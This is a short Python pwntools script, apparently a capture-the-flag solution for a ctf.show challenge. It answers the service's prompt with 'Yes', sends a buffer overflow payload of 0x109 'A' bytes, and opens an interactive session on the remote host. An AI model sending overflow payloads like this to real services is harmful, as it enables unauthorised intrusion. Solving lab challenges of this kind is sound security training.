from pwn import *
#context(log_level='debug',arch='i386', os='linux')
context(log_level='debug',arch='amd64', os='linux')

p=remote("pwn.challenge.ctf.show",28275)

p.sendlineafter("Input 'Yes' or 'No': ","Yes")

payload=b'A'*0x109

p.sendlineafter("Tell me you want: ",payload)

p.interactive()